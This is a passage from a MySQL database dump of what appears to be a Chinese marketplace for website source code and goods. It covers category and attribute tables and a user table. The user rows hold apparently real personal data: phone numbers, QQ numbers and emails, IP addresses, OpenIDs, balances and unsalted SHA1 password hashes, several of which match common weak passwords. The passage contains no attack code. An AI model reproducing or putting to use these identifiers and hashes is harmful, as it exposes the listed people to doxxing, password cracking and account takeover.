(43, 2, '源码/集市', '聊天/交友/直播', NULL, 4, '2019-06-12 22:52:15', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL),
(61, 1, '图纸/文档', NULL, NULL, 4, '2019-06-08 20:54:50', '#333', 1, NULL, NULL, NULL, 0, 0, '', '合作设计师原创作品，高清晰精美图片', '', 0, '', 0),
(63, 1, '汽车/用品', NULL, NULL, 6, '2019-06-08 20:54:58', '#333', 1, NULL, NULL, NULL, 0, 0, '', '', '', 0, '', 0),
(69, 2, '企业/网站', '织梦模板', NULL, 1, '2019-06-09 23:33:35', NULL, NULL, '织梦模板', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL),
(72, 2, '企业/网站', '自适应建站', NULL, 2, '2019-06-09 23:34:15', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL),
(74, 2, '实物/交易', '手机数码', NULL, 1, '2017-06-27 17:41:42', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(75, 2, '实物/交易', '衣服鞋帽', NULL, 2, '2017-06-27 17:42:42', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(76, 2, '实物/交易', '电脑办公', NULL, 3, '2017-04-04 16:37:16', NULL, 0, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(77, 2, '实物/交易', '家具家装', NULL, 4, '2017-04-04 16:37:23', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(78, 3, '实物/交易', '手机数码', '苹果', 1, '2017-04-04 16:37:50', '#333', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(79, 3, '实物/交易', '手机数码', '三星', 2, '2017-04-04 16:37:54', '#333', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(80, 3, '实物/交易', '手机数码', '华为', 3, '2017-04-04 16:37:57', '#333', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(81, 3, '实物/交易', '手机数码', '魅族', 4, '2017-04-04 16:38:04', '#333', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(82, 3, '实物/交易', '手机数码', '小米', 5, '2017-04-04 16:38:07', '#333', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(83, 3, '实物/交易', '手机数码', 'OPPO', 6, '2017-04-04 16:38:21', '#333', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(84, 2, '图纸/文档', '广告图片', NULL, 1, '2017-04-04 16:39:09', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(85, 2, '图纸/文档', '教程文档', NULL, 2, '2017-04-04 16:39:16', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(86, 2, '图纸/文档', '考题资料', NULL, 3, '2017-04-04 16:39:26', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(120, 1, '填充类别C', NULL, NULL, 9, '2019-06-08 20:55:34', '#333', 1, NULL, NULL, NULL, 0, 0, '', '', '', 0, '', 0),
(119, 1, '填充类别B', NULL, NULL, 8, '2019-06-08 20:55:26', '#333', 1, NULL, NULL, NULL, 0, 0, '', '', '', 0, '', 0),
(118, 1, '填充类别A', NULL, NULL, 7, '2019-06-08 20:55:18', '#333', 1, NULL, NULL, NULL, 0, 0, '', '', '', 0, '', 0),
(91, 2, '汽车/用品', '座垫', NULL, 1, '2017-04-04 16:46:50', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(92, 2, '汽车/用品', '导航', NULL, 2, '2017-04-04 16:47:14', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(93, 2, '汽车/用品', '防爆膜', NULL, 3, '2017-04-04 16:47:47', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(94, 2, '汽车/用品', ' 车衣', NULL, 4, '2017-04-04 16:47:52', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(95, 2, '汽车/用品', '记录仪', NULL, 5, '2017-04-04 16:48:05', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(96, 2, '汽车/用品', '座套', NULL, 6, '2017-04-04 16:48:12', NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(98, 2, '源码/集市', '小说/文章/文学', NULL, 5, '2019-06-12 22:52:39', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL),
(147, 1, '填充类别d', NULL, NULL, 10, '2019-06-10 04:08:16', '#333', 1, NULL, NULL, NULL, 0, 0, '', '', '', 0, NULL, 0),
(148, 2, '源码/集市', '医院/女人/健康', NULL, 6, '2019-06-12 22:52:55', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '所有源码均54455测试可用，请放心选购', '', NULL, NULL, NULL),
(149, 2, '源码/集市', '导航/网址/查询', NULL, 7, '2019-06-12 22:53:13', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '所有源码均54455测试可用，请放心选购', '', NULL, NULL, NULL),
(150, 2, '源码/集市', '淘客/网店/商城', NULL, 8, '2019-06-12 22:53:29', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '所有源码均54455测试可用，请放心选购', '', NULL, NULL, NULL),
(151, 3, '源码/集市', 'QQ非主流/图片', '三级分类', 1, '2019-06-21 04:53:32', '#333', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_typesx`
--

CREATE TABLE IF NOT EXISTS `yjcode_typesx` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` int(11) DEFAULT NULL,
  `name1` char(50) DEFAULT NULL,
  `name2` char(50) DEFAULT NULL,
  `admin` int(11) DEFAULT NULL,
  `xh` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `ifjd` int(10) DEFAULT NULL,
  `ifzi` int(10) DEFAULT NULL,
  `ifsel` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=34 ;

--
-- 转存表中的数据 `yjcode_typesx`
--

INSERT INTO `yjcode_typesx` (`id`, `typeid`, `name1`, `name2`, `admin`, `xh`, `sj`, `ifjd`, `ifzi`, `ifsel`) VALUES
(1, 37, '系统品牌', NULL, 1, 1, '2019-01-15 15:46:54', 1, 0, 1),
(2, 37, '开发语言', NULL, 1, 2, '2019-01-15 15:47:08', 1, 0, 1),
(3, 37, '数据库', NULL, 1, 3, '2019-01-15 15:47:17', 1, 0, 1),
(4, 37, '移动端', NULL, 1, 4, '2019-01-15 15:46:12', 1, 0, 0),
(7, 37, '系统品牌', '织梦', 2, 1, '2019-01-15 15:41:38', NULL, NULL, NULL),
(8, 37, '系统品牌', '帝国', 2, 2, '2019-01-15 15:41:45', NULL, NULL, NULL),
(9, 37, '系统品牌', '新云', 2, 3, '2019-01-15 15:41:52', NULL, NULL, NULL),
(10, 37, '系统品牌', '动易', 2, 4, '2019-01-15 15:42:01', NULL, NULL, NULL),
(11, 37, '系统品牌', '齐博', 2, 5, '2019-01-15 15:42:06', NULL, NULL, NULL),
(12, 37, '系统品牌', 'thinkphp', 2, 6, '2019-01-15 15:42:12', NULL, NULL, NULL),
(13, 37, '系统品牌', 'discuz', 2, 7, '2019-01-15 15:42:20', NULL, NULL, NULL),
(14, 37, '系统品牌', 'phpwind', 2, 8, '2019-01-15 15:42:26', NULL, NULL, NULL),
(15, 37, '系统品牌', 'ecshop', 2, 9, '2019-01-15 15:42:31', NULL, NULL, NULL),
(16, 37, '系统品牌', 'wordpress', 2, 10, '2019-01-15 15:42:36', NULL, NULL, NULL),
(17, 37, '系统品牌', 'phpcms', 2, 11, '2019-01-15 15:42:55', NULL, NULL, NULL),
(18, 37, '系统品牌', ' 其他', 2, 12, '2019-01-15 15:42:56', NULL, NULL, NULL),
(19, 37, '开发语言', 'ASP', 2, 1, '2019-01-15 15:43:14', NULL, NULL, NULL),
(20, 37, '开发语言', ' PHP', 2, 2, '2019-01-15 15:43:18', NULL, NULL, NULL),
(21, 37, '开发语言', 'NET', 2, 3, '2019-01-15 15:43:23', NULL, NULL, NULL),
(22, 37, '开发语言', ' 其他', 2, 4, '2019-01-15 15:43:24', NULL, NULL, NULL),
(23, 37, '数据库', 'Access', 2, 1, '2019-01-15 15:43:41', NULL, NULL, NULL),
(24, 37, '数据库', 'Mysql', 2, 2, '2019-01-15 15:43:46', NULL, NULL, NULL),
(25, 37, '数据库', 'Mssql', 2, 3, '2019-01-15 15:43:48', NULL, NULL, NULL),
(26, 37, '数据库', '其他', 2, 4, '2019-01-15 15:43:50', NULL, NULL, NULL),
(27, 37, '移动端', '无', 2, 1, '2019-01-15 15:44:45', NULL, NULL, NULL),
(28, 37, '移动端', 'Wap', 2, 2, '2019-01-15 15:44:51', NULL, NULL, NULL),
(29, 37, '移动端', 'App', 2, 3, '2019-01-15 15:44:57', NULL, NULL, NULL),
(30, 37, '移动端', ' Wap+App', 2, 4, '2019-01-15 15:45:00', NULL, NULL, NULL),
(31, 37, '移动端', '自适应', 2, 5, '2019-01-15 15:45:04', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_update`
--

CREATE TABLE IF NOT EXISTS `yjcode_update` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `sj` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=20 ;

--
-- 转存表中的数据 `yjcode_update`
--

INSERT INTO `yjcode_update` (`id`, `sj`) VALUES
(11, '2019-03-08 15:46:08'),
(12, '2019-05-13 15:37:35'),
(13, '2019-05-13 15:37:48'),
(14, '2019-05-27 23:21:53'),
(15, '2019-05-27 23:21:54'),
(16, '2019-08-28 17:42:11'),
(17, '2019-08-28 17:44:31'),
(18, '2019-10-03 10:48:27'),
(19, '2019-10-12 22:02:58');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_user`
--

CREATE TABLE IF NOT EXISTS `yjcode_user` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `uid` char(40) DEFAULT NULL,
  `pwd` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(40) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `jf` int(11) DEFAULT NULL,
  `nc` char(30) DEFAULT NULL,
  `mot` char(50) DEFAULT NULL,
  `ifmot` int(11) DEFAULT NULL,
  `email` char(50) DEFAULT NULL,
  `ifemail` int(11) DEFAULT NULL,
  `uqq` varchar(250) DEFAULT NULL,
  `weixin` char(50) DEFAULT NULL,
  `yxsj` datetime DEFAULT NULL,
  `openid` char(50) DEFAULT NULL,
  `ifqq` int(11) DEFAULT NULL,
  `djl` int(11) DEFAULT NULL,
  `shopname` char(50) DEFAULT NULL,
  `seokey` varchar(250) DEFAULT NULL,
  `seodes` varchar(250) DEFAULT NULL,
  `txt` text,
  `pm` int(11) DEFAULT NULL,
  `zt` int(11) DEFAULT NULL,
  `openshop` float DEFAULT NULL,
  `shopzt` int(11) DEFAULT NULL,
  `shopztsm` varchar(250) DEFAULT NULL,
  `getpwd` char(20) DEFAULT NULL,
  `bdmot` char(20) DEFAULT NULL,
  `bdemail` char(50) DEFAULT NULL,
  `txyh` char(30) DEFAULT NULL,
  `txname` char(30) DEFAULT NULL,
  `txzh` char(50) DEFAULT NULL,
  `txkhh` char(50) DEFAULT NULL,
  `zfmm` char(50) DEFAULT NULL,
  `sellmall` float DEFAULT NULL,
  `sellmyue` float DEFAULT NULL,
  `tjuserid` int(10) DEFAULT NULL,
  `sellbl` float DEFAULT NULL,
  `xinyong` int(10) DEFAULT NULL,
  `sfz` char(50) DEFAULT NULL,
  `sfzrz` int(10) DEFAULT '3',
  `sfzrzsm` varchar(250) DEFAULT NULL,
  `uname` char(40) DEFAULT NULL,
  `djmoney` int(10) DEFAULT '0',
  `pf1` float DEFAULT NULL,
  `pf2` float DEFAULT NULL,
  `pf3` float DEFAULT NULL,
  `baomoney` float DEFAULT NULL,
  `dqsj` datetime DEFAULT NULL,
  `userdj` char(40) DEFAULT NULL,
  `userdjdq` datetime DEFAULT NULL,
  `ordertx1` int(10) DEFAULT NULL,
  `ordertx2` int(10) DEFAULT NULL,
  `wxopenid` char(50) DEFAULT NULL,
  `myweb` char(50) DEFAULT NULL,
  `unionid` char(50) DEFAULT NULL,
  `mytxt` text,
  `shoptype` int(10) DEFAULT NULL,
  `openshop1` int(10) DEFAULT NULL,
  `mybh` char(50) DEFAULT NULL,
  `jbmot` char(50) DEFAULT NULL,
  `ifmian` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=975 ;

--
-- 转存表中的数据 `yjcode_user`
--

INSERT INTO `yjcode_user` (`id`, `uid`, `pwd`, `sj`, `uip`, `money1`, `jf`, `nc`, `mot`, `ifmot`, `email`, `ifemail`, `uqq`, `weixin`, `yxsj`, `openid`, `ifqq`, `djl`, `shopname`, `seokey`, `seodes`, `txt`, `pm`, `zt`, `openshop`, `shopzt`, `shopztsm`, `getpwd`, `bdmot`, `bdemail`, `txyh`, `txname`, `txzh`, `txkhh`, `zfmm`, `sellmall`, `sellmyue`, `tjuserid`, `sellbl`, `xinyong`, `sfz`, `sfzrz`, `sfzrzsm`, `uname`, `djmoney`, `pf1`, `pf2`, `pf3`, `baomoney`, `dqsj`, `userdj`, `userdjdq`, `ordertx1`, `ordertx2`, `wxopenid`, `myweb`, `unionid`, `mytxt`, `shoptype`, `openshop1`, `mybh`, `jbmot`, `ifmian`) VALUES
(14, '885617199', 'ed72ff586291beae72d97ff936dcba08e87b7444', '2017-03-02 19:51:26', '113.220.166.102', 49370, 61, '885617199', '18673809841', 1, '885617199@qq.com', 1, '885617199', '', '2019-10-03 10:52:30', NULL, NULL, 1900, '源码商城官方自营', '网站建设网站源码', '网站建设网站源码', '', 858527, 1, 0, 2, '', NULL, '1490784138', '185058', NULL, NULL, NULL, NULL, 'ed72ff586291beae72d97ff936dcba08e87b7444', 0, 0, 0, 1, 10999, NULL, 3, NULL, NULL, 0, 0, 0, 0, 0, NULL, '普通会员', NULL, 0, 1, NULL, '2456edf', NULL, NULL, NULL, NULL, '0323473001554700497', NULL, NULL),
(15, '249294043', '3a9e584fd33cd032455c52f7fdc64bf6f13f92e6', '2017-03-03 20:46:51', '223.157.131.226', 1103620, 850, '源码商城', '18073833920', 1, '249294043@qq.com', 1, '123456789', '', '2019-10-25 10:42:08', 'FB71601F2213DE060A8F649CD3AC4A7B', 1, 4840, '源码商城', '源码商城-直销进人系统-全民分销系统-自动营销系统-云计划系统-VE创系统', '最专业的直销进人系统,3年的开发经验,让直销人走出区域的限制,进入浩瀚的互联网,实现直销自动进人;突破进人难、发展慢、不稳定的瓶颈。直销自动进人系统让你的直销事业更上一层楼！', '', 5855, 1, 1010, 2, '', NULL, '', '212981', NULL, NULL, NULL, NULL, '3a9e584fd33cd032455c52f7fdc64bf6f13f92e6', 400, 400, 0, 0.8, 800, NULL, 3, NULL, NULL, 0, 5, 5, 5, 1000, '2020-03-31 20:20:17', '普通会员', NULL, 0, 1, NULL, '928vip', NULL, '', NULL, NULL, '0563212001554034808', NULL, NULL),
(16, 'lost', '263640201af31bcacd2846fad97b08a11790caa5', '2017-03-03 21:36:51', '58.16.197.93', 0.01, 40, '测试一下', NULL, 0, '12345678@qq.com', 0, '12345678', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '263640201af31bcacd2846fad97b08a11790caa5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(17, '15fd415', '1e9c48fedb74c408cfa764c2e6579345ad38b059', '2017-03-05 10:53:25', '183.240.19.229', 0.01, 10, '545484', NULL, 0, '123456@qq.com', 0, '123456', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1e9c48fedb74c408cfa764c2e6579345ad38b059', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(18, 'qq1488887892276', 'ed72ff586291beae72d97ff936dcba08e87b7444', '2017-03-07 19:58:12', '113.220.164.26', 0.01, 10, '源码商城', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '2C12EFE2FDC4663312185B041014FE1C', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(19, 'ouyaowu', '0e2f9f13220612f8bb385ebcb919a4fb11b87a6a', '2017-03-08 20:20:38', '59.40.93.15', 0.01, 10, 'ouyaowu', NULL, 0, '1712179232@qq.com', 0, '1712179232', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '0e2f9f13220612f8bb385ebcb919a4fb11b87a6a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(20, 'qq148903416255', 'b379503403193cc95571252da868fe23c8211d8d', '2017-03-09 12:36:02', '101.206.24.222', 0.01, 10, '庚庚有付项目总监', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '17A8BDDC728B1886B452CDFD2DD28E74', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(21, 'qq148904610523', '120f1eec88c75b2c96ea5d5d62c814791f04e7e7', '2017-03-09 15:55:05', '59.42.138.121', 0.01, 10, '爱黑树林', '13145201034', 1, '2597201314@qq.com', 1, NULL, NULL, '2014-10-15 00:00:00', 'DEF75A96296DAA10E903A6C9BB67A124', 1, 0, '我', '人人人', '人', NULL, 0, 1, 0, 0, NULL, NULL, '', '', NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(22, 'wuninglang', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2017-03-09 17:22:39', '60.222.97.199', 0.01, 10, 'wuninglang', NULL, 0, 'sdfasd2@ss.com', 0, '123456', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(23, 'qq1489059505177', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2017-03-09 19:38:25', '101.226.61.142', 0.01, 10, '我的中国梦-永泰乐', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '4E2AC96E083FE30ECACEAB9BEE46325F', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(24, '323121212', '52c21c8101406314315565c5024fb92527264418', '2017-03-11 15:16:34', '113.67.159.141', 0.01, 10, '323121212', NULL, 0, '323121212@ds.com', 0, '323121212', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '52c21c8101406314315565c5024fb92527264418', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(25, 'qq1489412079270', '88bf79677bd732e0181d0b36e6e03fb1b06ad034', '2017-03-13 21:34:39', '119.250.129.170', 0.01, 10, '爱情麻辣烫', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '4CEBAE2E6B1276C8A2A8AA0147563886', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(26, 'qq148957147611', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2017-03-15 17:51:16', '120.239.192.245', 0.01, 10, '小鱼儿', NULL, 0, NULL, 0, '7899436', NULL, '2014-10-15 00:00:00', 'A4E3E9A32665B6FC939CC980234D55D8', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(27, 'qq1489737764278', '0f7e84ca460da4584d15fe067254d37fe54ccc18', '2017-03-17 16:02:44', '183.240.22.84', 0.01, 10, 'nuLL', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '047B529B05C31DDF1B025F0EA93D2611', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(28, '120446848', '1ea130668e176ae5634ca85999c23d35ec47760c', '2017-03-17 19:04:10', '110.82.68.66', 0.01, 10, '红色太阳', NULL, 0, '120446818@qq.com', 0, '120446818', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1ea130668e176ae5634ca85999c23d35ec47760c', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(29, 'shaobing', '8a38231f964a73d71277eef0893f9fcb3700b8b5', '2017-03-18 00:13:10', '49.84.201.131', 0.01, 10, 'gjygt', NULL, 0, '534264534@qq.com', 0, '534264534', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(30, 'qq1490452021246', '514187e1b7c716c00dd42f9176a39548b4538c74', '2017-03-25 22:27:01', '111.73.175.22', 0.01, 30, '猫猫', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '6F4816A90C53942FE2E594C53110CC03', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(31, 'qq149063167489', '8a38231f964a73d71277eef0893f9fcb3700b8b5', '2017-03-28 00:21:14', '120.85.67.108', 0.01, 20, '小可爱', NULL, 0, NULL, 0, '9063167489', '9063167489', '2014-10-15 00:00:00', 'EA5B6E6936FA7B701B84B3164C9FAE04', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(32, 'qq149079613427', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2017-03-29 22:02:14', '43.250.200.188', 0.01, 10, '小牛牛', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '1B2DE8F67EB0A979CB066A7D9D519DAA', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(33, 'qq1490927440280', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', '2017-03-31 10:30:40', '124.207.28.124', 0.01, 10, '2017', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', 'D1B21A9889AB9A09BC866D2620C30375', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(34, 'qq1490949088227', '3acd0be86de7dcccdbf91b20f94a68cea535922d', '2017-03-31 16:31:28', '36.149.218.194', 0.01, 10, '哈哈', NULL, 0, NULL, 0, 'test666', NULL, '2018-04-12 12:20:03', '301BEE62CC3D11574B3FF6DF16F04255', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(35, 'qq1491221999266', '05866ef8100bca5bc48e701279c236a6f1cdcf42', '2017-04-03 20:19:59', '117.91.162.103', 0.01, 10, '胡杨林', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', 'FC2F5CD8C23E152CE1E06D261283ED71', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(36, 'kaixin88', '011d4e8ec6b35bcb29d0d7060d8cae8a8bccdff6', '2017-04-05 00:11:50', '175.1.72.88', 0.01, 10, '我飞你扬', '15576315559', 1, '253565121@qq.com', 0, '253565121', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, '011d4e8ec6b35bcb29d0d7060d8cae8a8bccdff6', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
